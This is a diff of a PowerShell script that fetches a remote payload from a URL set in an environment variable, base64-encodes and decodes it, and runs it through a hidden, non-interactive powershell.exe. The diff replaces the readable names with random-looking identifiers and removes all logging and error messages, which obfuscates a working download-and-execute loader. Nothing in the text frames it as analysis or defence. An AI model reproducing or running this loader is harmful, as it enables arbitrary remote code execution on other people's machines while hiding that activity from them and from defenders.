@@ -1,45 +1,35 @@
-function F {
+function XhYjVwJtKz {
     param (
-        [string]$u
+        [string]$AaBbCcDdEe
     )
 
     try {
-        $r = Invoke-WebRequest -Uri $u -TimeoutSec 10
-        return $r.Content
+        $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -TimeoutSec 10
+        return $FfGgHhIiJj.Content
     }
     catch {
-        Write-Host "[ERROR] Failed to fetch payload: $_"
         return $null
     }
 }
 
-function E {
+function XoRpQkZtLs {
     param (
-        [string]$p
+        [string]$PpQqRrSsTt
     )
 
     try {
-        $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p))
-        powershell.exe -NoP -NonI -W Hidden -Command $d
-        Write-Host "[INFO] Payload executed successfully."
+        $UuVvWwXxYy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PpQqRrSsTt))
+        powershell.exe -NoP -NonI -W Hidden -Command $UuVvWwXxYy
     }
     catch {
-        Write-Host "[ERROR] Failed to execute payload: $_"
     }
 }
 
-$u = $env:PAYLOAD_URL  
-Write-Host "[INFO] Fetching payload from URL: $u"
+$QwErTyUuOo = $env:PAYLOAD_URL  
 
-$p = F -u $u
+$VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo
 
-if ($p) {
-    Write-Host "[INFO] Payload fetched successfully. Executing..."
-    $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($p))
-    E -p $b64
+if ($VvWwXxYyZz) {
+    $ZzYyXxWwVv = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($VvWwXxYyZz))
+    XoRpQkZtLs -PpQqRrSsTt $ZzYyXxWwVv
 }
-else {
-    Write-Host "[ERROR] Unable to proceed without a valid payload."
-}
-
-
